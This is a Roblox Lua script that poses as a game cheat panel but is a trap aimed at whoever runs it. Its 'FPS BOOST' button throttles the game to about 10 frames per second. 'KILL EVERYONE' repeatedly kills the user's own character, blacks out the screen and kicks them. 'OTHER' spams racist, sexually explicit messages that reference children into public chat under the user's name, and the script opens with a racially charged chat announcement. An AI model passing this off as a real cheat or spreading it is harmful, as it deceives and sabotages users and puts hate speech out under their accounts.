game:GetService("TextChatService")
	.TextChannels.RBXGeneral:SendAsync("🔥 NIJERIAN CHEAT LOADED. [FREE FOR AFRICANS] v9🔥")

local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local RS = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local TextChatService = game:GetService("TextChatService")

local plr = Players.LocalPlayer

-- ================= KEY + LOADING =================

local gui = Instance.new("ScreenGui", plr.PlayerGui)

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.fromScale(0.3, 0.18)
frame.Position = UDim2.fromScale(0.35, 0.4)
frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.fromScale(1,0.4)
title.BackgroundTransparency = 1
title.Text = "PRESS K TO ENTER KEY"
title.TextScaled = true
title.TextColor3 = Color3.new(1,1,1)

local box = Instance.new("TextBox", frame)
box.Size = UDim2.fromScale(0.8,0.35)
box.Position = UDim2.fromScale(0.1,0.5)
box.TextEditable = false
box.PlaceholderText = "Key locked"
box.TextScaled = true
box.BackgroundColor3 = Color3.fromRGB(35,35,35)
box.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", box).CornerRadius = UDim.new(0,8)

UIS.InputBegan:Connect(function(i,gp)
	if gp then return end
	if i.KeyCode == Enum.KeyCode.K then
		box.TextEditable = true
		box:CaptureFocus()
	end
end)

local function shake()
	local p = frame.Position
	frame.Position = p + UDim2.fromOffset(math.random(-4,4), math.random(-4,4))
	task.wait(0.03)
	frame.Position = p
end

box.FocusLost:Connect(function(enter)
	if not enter or box.Text ~= "ILoveSuckingBallz" then return end

	box:Destroy()
	title:Destroy()

	local t = Instance.new("TextLabel", frame)
	t.Size = UDim2.fromScale(1,0.6)
	t.BackgroundTransparency = 1
	t.TextScaled = true
	t.TextColor3 = Color3.new(1,1,1)

	for i = 0,100 do
		t.Text = "LOADING MODULES "..i.."%"
		shake()
		task.wait(0.05)
	end

	gui:Destroy()

	-- ================= FAKE CHEAT GUI =================

	local fakeGui = Instance.new("ScreenGui", plr.PlayerGui)

	local main = Instance.new("Frame", fakeGui)
	main.Size = UDim2.fromScale(0.32, 0.38)
	main.Position = UDim2.fromScale(0.68, 0.30)
	main.BackgroundColor3 = Color3.fromRGB(18,18,18)
	Instance.new("UICorner", main).CornerRadius = UDim.new(0,14)

	local cheatTitle = Instance.new("TextLabel", main)
	cheatTitle.Size = UDim2.fromScale(1, 0.16)
	cheatTitle.BackgroundTransparency = 1
	cheatTitle.Text = "PRIVATE CHEAT PANEL"
	cheatTitle.TextScaled = true
	cheatTitle.TextColor3 = Color3.new(1,1,1)

	local function makeButton(text, posY)
		local b = Instance.new("TextButton", main)
		b.Size = UDim2.fromScale(0.8, 0.16)
		b.Position = UDim2.fromScale(0.1, posY)
		b.Text = text
		b.TextScaled = true
		b.BackgroundColor3 = Color3.fromRGB(30,30,30)
		b.TextColor3 = Color3.new(1,1,1)
		Instance.new("UICorner", b).CornerRadius = UDim.new(0,10)
		return b
	end

	-- BUTON SIRASI
	local fpsBtn   = makeButton("FPS BOOST", 0.22)
	local otherBtn = makeButton("OTHER", 0.42)
	local killBtn  = makeButton("KILL EVERYONE", 0.62)

	-- ========== FPS ~10 ==========
	local fpsOn = false
	RunService.RenderStepped:Connect(function()
		if fpsOn then
			local s = os.clock()
			while os.clock() - s < 0.1 do end -- ~10 FPS
		end
	end)

	-- ========== KILL + BLACK + 6s AFTER KICK ==========
	local killOn = false
	local function enableKill()
		if killOn then return end
		killOn = true

		-- siyah ekran
		local blackGui = Instance.new("ScreenGui", plr.PlayerGui)
		local black = Instance.new("Frame", blackGui)
		black.Size = UDim2.fromScale(1,1)
		black.BackgroundColor3 = Color3.new(0,0,0)
		black.BorderSizePixel = 0

		-- sürekli öldür
		task.spawn(function()
			while killOn do
				local char = plr.Character or plr.CharacterAdded:Wait()
				local hum = char:FindFirstChildOfClass("Humanoid")
				if hum then hum.Health = 0 end
				task.wait(1)
			end
		end)

		-- 6 saniye sonra kick
		task.delay(6, function()
			pcall(function()
				plr:Kick("Connection lost.")
			end)
		end)
	end

	-- ========== CHAT hi SPAM ==========
	local spamOn = false
	local function enableSpam()
		if spamOn then return end
		spamOn = true
		task.spawn(function()
			while spamOn do
				pcall(function()
					TextChatService.TextChannels.RBXGeneral:SendAsync("I LOVE SUCKING BIG BLACK DICKS CUZ I AM WHITE AND MY DICK IS TOO SMALL THAT IT IS ONLY FOR CHILDS")
				end)
				task.wait(0.35)
			end
		end)
	end

	local function toggle(btn)
		if btn.Text:find("%[ON%]") then return end
		btn.Text = btn.Text .. " [ON]"
		btn.BackgroundColor3 = Color3.fromRGB(120,0,0)
	end

	fpsBtn.MouseButton1Click:Connect(function()
		toggle(fpsBtn)
		fpsOn = true
	end)

	otherBtn.MouseButton1Click:Connect(function()
		toggle(otherBtn)
		enableSpam()
	end)

	killBtn.MouseButton1Click:Connect(function()
		toggle(killBtn)
		enableKill()
	end)
end)
